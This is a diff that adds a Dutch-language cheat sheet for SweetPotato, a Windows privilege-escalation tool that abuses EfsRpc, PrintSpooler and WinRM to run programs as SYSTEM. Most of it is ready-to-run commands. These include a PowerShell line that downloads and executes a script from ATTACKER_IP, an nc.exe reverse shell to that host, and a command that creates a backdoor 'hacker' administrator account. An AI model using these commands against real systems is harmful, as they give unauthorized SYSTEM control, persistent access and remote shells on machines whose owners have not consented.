@@ -1,0 +1,44 @@
+# SweetPotato — Potato-family privilege escalation (combineert meerdere technieken)
+# Combineert PrintSpoofer, EfsPotato en JuicyPotato in één tool voor SYSTEM escalatie
+#
+# === Syntax ===
+# SweetPotato.exe [opties]
+#
+# === Belangrijkste opties ===
+# -p <program>      Programma om uit te voeren als SYSTEM (standaard: cmd.exe)
+# -a <arguments>    Argumenten voor het programma
+# -e <exploit>       Exploit methode: EfsRpc, PrintSpooler, WinRM (standaard: EfsRpc)
+# -l <port>         COM listener poort (standaard: random)
+#
+# === Vereisten ===
+# SeImpersonatePrivilege of SeAssignPrimaryTokenPrivilege
+# Controleer: whoami /priv
+#
+# === Voorbeelden ===
+
+# Standaard: cmd.exe als SYSTEM via EfsRpc
+SweetPotato.exe
+
+# Specifiek commando uitvoeren
+SweetPotato.exe -p cmd.exe -a "/c whoami"
+
+# PrintSpooler methode gebruiken
+SweetPotato.exe -e PrintSpooler -p cmd.exe -a "/c whoami"
+
+# WinRM methode gebruiken
+SweetPotato.exe -e WinRM -p cmd.exe -a "/c whoami"
+
+# Reverse shell als SYSTEM
+SweetPotato.exe -p cmd.exe -a "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+
+# Gebruiker toevoegen als admin
+SweetPotato.exe -p cmd.exe -a "/c net user hacker P@ssw0rd123 /add && net localgroup Administrators hacker /add"
+
+# Netcat reverse shell
+SweetPotato.exe -p C:\Windows\Tasks\nc.exe -a "ATTACKER_IP 443 -e cmd.exe"
+
+# Specifieke COM listener poort
+SweetPotato.exe -l 1337 -p cmd.exe -a "/c whoami"
+
+# NOTE: Probeer verschillende -e methoden als één niet werkt
+# NOTE: EfsRpc werkt vaak op nieuwere Windows versies waar JuicyPotato niet meer werkt
